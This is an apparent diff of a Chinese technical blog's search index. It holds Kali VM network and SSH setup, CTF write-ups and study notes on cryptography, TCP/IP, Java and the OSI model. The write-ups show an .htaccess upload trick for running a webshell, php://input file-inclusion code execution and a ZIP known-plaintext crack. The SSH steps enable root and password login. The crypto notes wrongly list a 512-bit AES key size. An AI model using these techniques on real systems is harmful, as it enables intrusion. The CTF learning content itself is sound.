+<p><code>:wq</code>保存退出之后，重启网卡</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service networking restart</span><br></pre></td></tr></table></figure>
+<p>然后<code>ping www.baidu.com</code>测试是否正常连接，再ping一下主机ip看是否成功。</p>
+<p>若主机能够ping通虚拟机，而虚拟机ping不通主机，则可能是被主机的防火墙拦截了，具体可以查看https://blog.csdn.net/hskw444273663/article/details/81301470</p>
+<p>到这里，主机和虚拟机能互相ping通，则网卡设置完成☺️</p>
+<h2 id="SSH配置"><a class="header-anchor" href="#SSH配置"></a>SSH配置</h2>
+<p>一般来说，kali默认已经安装了SSH</p>
+<p>首先查看SSH状态</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -e|grep ssh</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/ssh%E7%8A%B6%E6%80%81.jpg" alt></p>
+<p>如图所示，表示ssh服务已启动，若没有，则尝试手动启动</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo service ssh start</span><br></pre></td></tr></table></figure>
+<p>然后修改sshd_config</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br></pre></td></tr></table></figure>
+<p>找到<code>#PasswordAuthentication no</code>,把注释去掉，再把no改成yes</p>
+<p>找到<code>#PermitRootLogin yes</code>,去掉注释</p>
+<p>保存退出。</p>
+<p>重启SSH服务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service ssh restart</span><br></pre></td></tr></table></figure>
+<p>要使ssh开机启动，命令为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update-re.d ssh enable</span><br></pre></td></tr></table></figure>
+<h2 id="代理设置"><a class="header-anchor" href="#代理设置"></a>代理设置</h2>
+<p>虚拟机想要连接外网，同样需要网络代理。如果宿主机已配置代理，那么直接让虚拟机连接主机代理上网即可。</p>
+<p>已<code>v2ray</code>为例，在参数设置-v2rayN设置中勾选<code>允许来自局域网的连接</code>。</p>
+<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105308512.png" style="zoom:80%;">
+<p>确定保存后，在v2ray界面底部查看代理地址</p>
+<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105508684.png" alt="image-20210320105508684"></p>
+<p>返回虚拟机，设置-网络-网络代理-手动，填写你的v2ray代理地址</p>
+<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105106748.png" style="zoom:67%;">
+<p>最后设置浏览器代理为系统代理即可。</p>
+<p>开启主机代理之后，虚拟机访问所有网站都会经过主机的代理服务器，所以在访问国内网站时可能速度较慢。</p>
+]]></content>
+      <categories>
+        <category>环境配置</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>环境配置</tag>
+        <tag>kali</tag>
+        <tag>SSH</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传</title>
+    <url>/2020/08/04/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h2 id="MRCTF2020-你传你🐎呢"><a class="header-anchor" href="#MRCTF2020-你传你🐎呢"></a>[MRCTF2020] 你传你🐎呢</h2>
+<p><img src="/2020/08/04/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200804123829115.png" alt="image-20200804123829115"></p>
+<p>尝试上传一些文件，发现只有.jpg 和 .htaccess 后缀的文件能够上传，<code>Content-Type</code>需要修改为 <code>image/jpeg</code></p>
+<p><img src="/2020/08/04/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1988809-20200401194611819-1412530212.png" alt="img"></p>
+<p><code>.htaccess</code>文件的利用：<a href="https://www.andseclab.com/2020/03/12/htaccess%E5%88%A9%E7%94%A8%E7%AF%87/">https://www.andseclab.com/2020/03/12/htaccess%E5%88%A9%E7%94%A8%E7%AF%87/</a></p>
+<p>通过上传一个<code>.htaccess</code>,能够将后面上传的jpg文件解析为php，这样就可以使用蚁剑连接</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<p>这里代码的意思是只要文件名中包含<code>1</code>，那么就当成php处理。</p>
+<p>然后我们再将一句话木马文件名修改为<code>1.jpg</code>，上传，即可成功访问。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>CTF</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>代码审计</title>
     <url>/2020/08/23/CTF/Web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
     <content><![CDATA[<h2 id="PHP函数漏洞及其绕过姿势"><a class="header-anchor" href="#PHP函数漏洞及其绕过姿势"></a>PHP函数漏洞及其绕过姿势</h2>
@@ -1215,6 +1262,34 @@
       <tags>
         <tag>CTF</tag>
         <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含</title>
+    <url>/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<h2 id="“百度杯”-2017-二月场-include"><a class="header-anchor" href="#“百度杯”-2017-二月场-include"></a>[“百度杯” 2017 二月场] include</h2>
+<p>简单的文件包含题。</p>
+<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818013712744.png" alt="image-20200818013712744"></p>
+<p>在phpinfo中可以发现</p>
+<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818013827411.png" alt="image-20200818013827411"></p>
+<p><code>allow_url_fopen</code>关闭，<code>allow_url_include</code>开启，可能可以通过php伪协议 <code>php://input</code> 来执行我们的php代码</p>
+<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818014205521.png" alt="image-20200818014205521"></p>
+<p>尝试发现确实可行</p>
+<p>现在我们就可以任意执行php代码了</p>
+<p>对当前文件夹进行目录遍历</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">myScanDir</span><span class="params">($dir)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $file_arr = scandir($dir);</span><br><span class="line">        $new_arr = [];</span><br><span class="line">        <span class="keyword">foreach</span>($file_arr <span class="keyword">as</span> $item)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($item!=<span class="string">".."</span> &amp;&amp; $item !=<span class="string">"."</span>)&#123;</span><br><span class="line"></span><br><span class="line">                $new_arr[] = $item;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $new_arr;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $dir = myScanDir(<span class="string">"./"</span>);</span><br><span class="line"></span><br><span class="line">    var_dump($dir); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818014553708.png" alt="image-20200818014553708"></p>
+<p>输出文件内容即可得到flag</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">show_source(<span class="string">"./dle345aae.php"</span>);</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>CTF</tag>
+        <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
@@ -1274,6 +1349,39 @@
       </tags>
   </entry>
   <entry>
+    <title>压缩包破解</title>
+    <url>/2020/08/18/CTF/%E6%9D%82%E9%A1%B9/%E5%8E%8B%E7%BC%A9%E5%8C%85/</url>
+    <content><![CDATA[<h2 id="ZIP明文攻击"><a class="header-anchor" href="#ZIP明文攻击"></a>ZIP明文攻击</h2>
+<h3 id="CISCN-2017-WarmUp"><a class="header-anchor" href="#CISCN-2017-WarmUp"></a>[CISCN 2017] WarmUp</h3>
+<p>给我们的是一个加密的压缩包以及一个 readme.txt</p>
+<p>而压缩包中也存在该文件</p>
+<p>考虑ZIP明文攻击</p>
+<ol>
+<li>
+<p>将 readme.txt 压缩为 readme.zip</p>
+</li>
+<li>
+<p>使用 bandzip 打开，查看CRC校验码</p>
+</li>
+<li>
+<p>发现 readme.zip 与加密压缩包中的 readme.txt 校验码相同，说明可以使用ZIP明文攻击</p>
+</li>
+<li>
+<p>使用<code>ARCHPR</code>对加密压缩包进行破解即可</p>
+<p><img src="/2020/08/18/CTF/%E6%9D%82%E9%A1%B9/%E5%8E%8B%E7%BC%A9%E5%8C%85/image-20200818122011977.png" alt="image-20200818122011977"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Misc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XSS</title>
     <url>/2020/08/03/CTF/Web/XSS/</url>
     <content><![CDATA[<h2 id="反射型XSS"><a class="header-anchor" href="#反射型XSS"></a>反射型XSS</h2>
@@ -1309,90 +1417,6 @@
         <tag>漏洞</tag>
         <tag>CTF</tag>
         <tag>XSS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件包含</title>
-    <url>/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[<h2 id="“百度杯”-2017-二月场-include"><a class="header-anchor" href="#“百度杯”-2017-二月场-include"></a>[“百度杯” 2017 二月场] include</h2>
-<p>简单的文件包含题。</p>
-<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818013712744.png" alt="image-20200818013712744"></p>
-<p>在phpinfo中可以发现</p>
-<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818013827411.png" alt="image-20200818013827411"></p>
-<p><code>allow_url_fopen</code>关闭，<code>allow_url_include</code>开启，可能可以通过php伪协议 <code>php://input</code> 来执行我们的php代码</p>
-<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818014205521.png" alt="image-20200818014205521"></p>
-<p>尝试发现确实可行</p>
-<p>现在我们就可以任意执行php代码了</p>
-<p>对当前文件夹进行目录遍历</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">myScanDir</span><span class="params">($dir)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $file_arr = scandir($dir);</span><br><span class="line">        $new_arr = [];</span><br><span class="line">        <span class="keyword">foreach</span>($file_arr <span class="keyword">as</span> $item)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($item!=<span class="string">".."</span> &amp;&amp; $item !=<span class="string">"."</span>)&#123;</span><br><span class="line"></span><br><span class="line">                $new_arr[] = $item;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $new_arr;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $dir = myScanDir(<span class="string">"./"</span>);</span><br><span class="line"></span><br><span class="line">    var_dump($dir); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818014553708.png" alt="image-20200818014553708"></p>
-<p>输出文件内容即可得到flag</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">show_source(<span class="string">"./dle345aae.php"</span>);</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-        <tag>CTF</tag>
-        <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件上传</title>
-    <url>/2020/08/04/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<h2 id="MRCTF2020-你传你🐎呢"><a class="header-anchor" href="#MRCTF2020-你传你🐎呢"></a>[MRCTF2020] 你传你🐎呢</h2>
-<p><img src="/2020/08/04/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200804123829115.png" alt="image-20200804123829115"></p>
-<p>尝试上传一些文件，发现只有.jpg 和 .htaccess 后缀的文件能够上传，<code>Content-Type</code>需要修改为 <code>image/jpeg</code></p>
-<p><img src="/2020/08/04/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1988809-20200401194611819-1412530212.png" alt="img"></p>
-<p><code>.htaccess</code>文件的利用：<a href="https://www.andseclab.com/2020/03/12/htaccess%E5%88%A9%E7%94%A8%E7%AF%87/">https://www.andseclab.com/2020/03/12/htaccess%E5%88%A9%E7%94%A8%E7%AF%87/</a></p>
-<p>通过上传一个<code>.htaccess</code>,能够将后面上传的jpg文件解析为php，这样就可以使用蚁剑连接</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
-<p>这里代码的意思是只要文件名中包含<code>1</code>，那么就当成php处理。</p>
-<p>然后我们再将一句话木马文件名修改为<code>1.jpg</code>，上传，即可成功访问。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-        <tag>CTF</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>压缩包破解</title>
-    <url>/2020/08/18/CTF/%E6%9D%82%E9%A1%B9/%E5%8E%8B%E7%BC%A9%E5%8C%85/</url>
-    <content><![CDATA[<h2 id="ZIP明文攻击"><a class="header-anchor" href="#ZIP明文攻击"></a>ZIP明文攻击</h2>
-<h3 id="CISCN-2017-WarmUp"><a class="header-anchor" href="#CISCN-2017-WarmUp"></a>[CISCN 2017] WarmUp</h3>
-<p>给我们的是一个加密的压缩包以及一个 readme.txt</p>
-<p>而压缩包中也存在该文件</p>
-<p>考虑ZIP明文攻击</p>
-<ol>
-<li>
-<p>将 readme.txt 压缩为 readme.zip</p>
-</li>
-<li>
-<p>使用 bandzip 打开，查看CRC校验码</p>
-</li>
-<li>
-<p>发现 readme.zip 与加密压缩包中的 readme.txt 校验码相同，说明可以使用ZIP明文攻击</p>
-</li>
-<li>
-<p>使用<code>ARCHPR</code>对加密压缩包进行破解即可</p>
-<p><img src="/2020/08/18/CTF/%E6%9D%82%E9%A1%B9/%E5%8E%8B%E7%BC%A9%E5%8C%85/image-20200818122011977.png" alt="image-20200818122011977"></p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Misc</tag>
       </tags>
   </entry>
   <entry>
@@ -1493,47 +1517,6 @@
       </tags>
   </entry>
   <entry>
-    <title>密码算法</title>
-    <url>/2021/08/09/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</url>
-    <content><![CDATA[<h2 id="对称加密"><a class="header-anchor" href="#对称加密"></a>对称加密</h2>
-<ul>
-<li>DES（Data Encryption Standard）：数据加密标准，速度较快，适用于加密大量数据的场合；</li>
-<li>3DES（Triple DES）：是基于DES，对一块数据用三个不同的密钥进行三次加密，强度更高；</li>
-<li>AES（Advanced Encryption Standard）：高级加密标准，是下一代的加密算法标准，速度快，安全级别高，支持128、192、256、512位密钥的加密；</li>
-<li>RC2：分组加密，输入输出均为64位</li>
-<li>RC4：流密码</li>
-<li>Blowfish：区块加密算法</li>
-</ul>
-<h2 id="非对称加密"><a class="header-anchor" href="#非对称加密"></a>非对称加密</h2>
-<ul>
-<li>
-<p>RSA：基于大数分解难题</p>
-<ul>
-<li>随意选择两个大的质数p和q，p不等于q，计算N = pq.</li>
-<li>根据欧拉函数，求得r=φ(N)=φ§φ(q)=(p-1)(q-1)。</li>
-<li>选择一个小于r的整数e,是e与r互质。并求得e关于r的模反元素，命名为d。(求d令ed≡1(mod r))。(模反元素存在，当且仅当e与r互质）</li>
-<li>将p和q的记录销毁。</li>
-</ul>
-<p>其中(N，e)是公钥，(N，d)是私钥。</p>
-<p>参考：<a href="https://blog.csdn.net/gao131360144/article/details/79966094">https://blog.csdn.net/gao131360144/article/details/79966094</a></p>
-</li>
-<li>
-<p>DSA：基于整数有限域离散对数难题</p>
-</li>
-<li>
-<p>ECC：椭圆曲线</p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>专业课</category>
-        <category>密码学</category>
-      </categories>
-      <tags>
-        <tag>密码学</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>指令集和操作系统位数</title>
     <url>/2020/06/10/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%8C%87%E4%BB%A4%E9%9B%86%E5%92%8C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%8D%E6%95%B0/</url>
     <content><![CDATA[<h2 id="指令集"><a class="header-anchor" href="#指令集"></a>指令集</h2>
@@ -1552,160 +1535,6 @@
       </categories>
       <tags>
         <tag>操作系统</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>TCP&amp;IP</title>
-    <url>/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&amp;IP/</url>
-    <content><![CDATA[<h2 id="TCP"><a class="header-anchor" href="#TCP"></a>TCP</h2>
-<h3 id="三次握手和四次挥手"><a class="header-anchor" href="#三次握手和四次挥手"></a>三次握手和四次挥手</h3>
-<p>TCP是可靠的，面向连接的传输层协议，端到端之间要进行TCP通信首先就要建立起TCP连接，当通信结束时断开TCP连接。这里TCP连接的建立与断开过程就分别由<code>三次握手</code>和<code>四次挥手</code>来完成。</p>
-<ul>
-<li>
-<p>三次握手</p>
-<p>TCP连接是通过三次握手进行初始化的。三次握手的目的是同步连接双方的序列号和确认号并交换 TCP窗口大小信息。具体过程如下图所示。</p>
-<p><img src="/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&IP/image-20210316191610581.png" alt="image-20210316191610581"></p>
-<p><strong>第一次握手：</strong> 建立连接。客户端发送连接请求报文段，SYN位置为1，Sequence Number为随机数<code>i</code>；然后，客户端进入SYN_SENT状态，等待服务器的确认；</p>
-<p><strong>第二次握手：</strong> 服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为<code>i+1</code> ( Sequence Number+1 )；同时，自己自己还要发送SYN请求信息，SYN设置为1，Sequence Number为<code>j</code>；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RCVD状态；</p>
-<p><strong>第三次握手：</strong> 客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为<code>j+1</code>，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。</p>
-<p>在wireshark中可以分别查看<code>ACK</code>和<code>Seq</code>的实际值和相对值，第一个包的Seq相对值为0。</p>
-<p><strong><code>Seq</code>的相对值为当前端已发送的TCP总段长，<code>ACK</code>的相对值为当前端已接收的TCP总段长（单位：字节），</strong><code>SYN</code>标志位和<code>FIN</code>标志位也要占1字节（其他标志位如ACK不占）。</p>
-</li>
-<li>
-<p>四次挥手</p>
-<img src="/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&IP/image-20210316213743223.png" style="zoom:50%;">
-<p><strong>中断连接端可以是Client端，也可以是Server端。</strong></p>
-<p>假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说&quot;我Client端没有数据要发给你了&quot;，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，“告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，“告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，&quot;就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，“就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！</p>
-</li>
-</ul>
-<h3 id="TCP-UDP"><a class="header-anchor" href="#TCP-UDP"></a>TCP/UDP</h3>
-<p>有连接/无连接（可靠/不可靠）</p>
-<p>有拆分合并/无拆分合并</p>
-<p>有拥塞控制/无拥塞控制（发送速率的调整）</p>
-<p>单播/多播</p>
-<h3 id="滑动窗口和流量控制"><a class="header-anchor" href="#滑动窗口和流量控制"></a>滑动窗口和流量控制</h3>
-<h3 id="拥塞控制"><a class="header-anchor" href="#拥塞控制"></a>拥塞控制</h3>
-<h2 id="http-https"><a class="header-anchor" href="#http-https"></a>http/https</h2>
-<h3 id="http各版本区别"><a class="header-anchor" href="#http各版本区别"></a>http各版本区别</h3>
-<p>http1.0 vs http1.1</p>
-<p>http1.1开始，默认使用长连接（HTTP协议的长连接和短连接，实质上是TCP协议的长连接和短连接。）</p>
-<p>http1.1增加了一些错误状态码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。</p>
-<h3 id="SSL-TLS"><a class="header-anchor" href="#SSL-TLS"></a>SSL/TLS</h3>
-<ul>
-<li>首先由客户端发送Client Hello 消息到服务器，消息中主要包含了客户端支持的<code>ciphersuites</code>， TLS 版本信息和客户端随机数。<strong>注意此时是明文传输</strong></li>
-<li>服务器接收到消息后，返回自己支持的<code>ciphersuites</code>， TLS 版本，<strong>自己的数字证书</strong>和服务器端生成的随机数。<strong>注意此时是明文传输</strong></li>
-<li>客户端开始验证数字证书，可能会不断往上追溯 CA、CA 的 CA、CA 的 CA 的 CA，直到一个受信的 CA。验证完证书之后生成一个新的<code>pre-master key</code>，再使用证书中的公钥来对<code>pre-master key</code>进行加密，然后发送给服务器。<strong>注意此时是非对称加密传输</strong></li>
-<li>服务器接收到客户端发送过来的非对称加密的密文，使用自己的私钥进行解密，获得了<code>pre-master key</code>。<strong>注意此时是非对称加密传输</strong></li>
-<li>到这里为止，服务器和客户端都有三组数字，**分别是客户端的随机数、服务器的随机数和pre-master key。**其中由于客户端的随机数和服务器的随机数都是使用明文传输，所以这两个数字是有被暴露的风险的，但是由于<code>pre-master key</code>是使用非对称加密传输，十分安全，所以将这三者结合，使用之前协商好的特定的算法就可以生成一个密钥，这个密钥称为<code>shared secert</code>。也就是之后用来对称加密的密钥。</li>
-<li>客户端在计算出对称加密的密钥之后，使用该密钥进行对称加密通信，告知服务器之后都使用该密钥进行对称加密。<strong>注意此时是对称加密传输</strong></li>
-<li>服务器接收到密文后，使用之前计算出的密钥来进行对称解密，解密成功之后，再使用该密钥进行对称加密通信。告知客户端密钥确认无误，可以使用该密钥进行通信。<strong>注意此时是对称加密传输</strong></li>
-<li>至此，整个TLS的握手过程完整，之后就可以开始对称加密的通信了。</li>
-</ul>
-<h2 id="参考文章"><a class="header-anchor" href="#参考文章"></a>参考文章</h2>
-<ul>
-<li><a href="https://blog.csdn.net/whuslei/article/details/6667471">TCP协议中的三次握手和四次挥手(图解)</a></li>
-<li><a href="https://zhuanlan.zhihu.com/p/72587882">关于 TCP/IP，必知必会的10个问题</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>专业课</category>
-        <category>计网</category>
-      </categories>
-      <tags>
-        <tag>计算机网络</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java 异常及处理</title>
-    <url>/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/</url>
-    <content><![CDATA[<h2 id="分类"><a class="header-anchor" href="#分类"></a>分类</h2>
-<p><img src="/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/image-20200516112004702.png" alt="image-20200516112004702"></p>
-<h2 id="异常的处理"><a class="header-anchor" href="#异常的处理"></a>异常的处理</h2>
-<h3 id="向上抛出（throws-异常类型）"><a class="header-anchor" href="#向上抛出（throws-异常类型）"></a>向上抛出（throws+异常类型）</h3>
-<p>不处理异常，将异常抛出给调用者。</p>
-<p><code>throw</code>  、<code>throws</code></p>
-<p>（挖坑待填）</p>
-<h3 id="就地捕获（try-catch-finally）"><a class="header-anchor" href="#就地捕获（try-catch-finally）"></a>就地捕获（try-catch-finally）</h3>
-<p>当程序发生异常时，系统捕获异常，转而执行异常处理代码。</p>
-<ol>
-<li>可能出现异常的代码用<code>try</code>块括起来</li>
-<li>用<code>catch</code>块来捕获异常并处理异常</li>
-<li>一些不论是否出现异常都需要执行的代码，用<code>finally</code>块括起来，使其一定会被执行</li>
-</ol>
-<p><strong>代码执行过程的三种情况</strong></p>
-<ol>
-<li>
-<p>try代码块中无异常，try代码执行完成，则不进入不执行catch(跳过)，执行finally块，及异常块后的其他代码other code；</p>
-</li>
-<li>
-<p>try代码块中发生异常，try代码执行到有异常处即之后中断，产生异常对象(跟踪堆栈,执行流程)，进入catch块(异常类型匹配后处理)，后执行finally块，及异常块后的其他代码other code；</p>
-</li>
-<li>
-<p>try代码块中发生异常，产生异常对象，异常类型不匹配，或者不捕获，程序中断运行(不用try和catch块进行处理，代码在异常出停止)；</p>
-</li>
-</ol>
-<blockquote>
-<p>finally块语句唯一不执行的情况：异常处理代码catch中执行System.exit(1)退出Java虚拟机 ；</p>
-<p>一段代码可能会发生多种类型的异常，当发生异常，会按顺序查看每个catch语句，并执行第一个与异常类型匹配的catch块，执行后，其他的catch语句将忽略，执行继续执行finally块，及异常块后的其他代码other code。</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>编程语言</category>
-        <category>Java</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>OSI模型</title>
-    <url>/2020/08/02/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/OSI%E6%A8%A1%E5%9E%8B/</url>
-    <content><![CDATA[<h2 id="OSI-模型"><a class="header-anchor" href="#OSI-模型"></a>OSI 模型</h2>
-<h3 id="应用层"><a class="header-anchor" href="#应用层"></a>应用层</h3>
-<p>能产生数据流量的并且能与用户交互的程序</p>
-<p>记事本不是，因为不能产生数据流量</p>
-<h3 id="表示层"><a class="header-anchor" href="#表示层"></a>表示层</h3>
-<p>传递消息的语法和语义（不同内部数据表示法 编码方法 压缩 加密）</p>
-<h3 id="会话层"><a class="header-anchor" href="#会话层"></a>会话层</h3>
-<p>对话控制（记录该由谁来发送数据）</p>
-<p>令牌管理（禁止双方同时执行同一关键操作）</p>
-<p>同步功能（设置断点，崩溃恢复）</p>
-<h3 id="传输层"><a class="header-anchor" href="#传输层"></a>传输层</h3>
-<p>真正的端到端的层。解决的问题：<strong>进程与进程之间传输</strong>、识别进程</p>
-<h3 id="网络层"><a class="header-anchor" href="#网络层"></a>网络层</h3>
-<p>控制子网的运行 ，如何将数据包从源端路由到接收方。解决的问题：<strong>路由</strong>、<strong>拥塞控制</strong>、<strong>异构网络互联</strong></p>
-<h3 id="数据链路层"><a class="header-anchor" href="#数据链路层"></a>数据链路层</h3>
-<p>将一个原始的传输设施转变成一条没有漏检传输错误的线路。解决的问题：数据帧、流量控制、信道共享</p>
-<h3 id="物理层"><a class="header-anchor" href="#物理层"></a>物理层</h3>
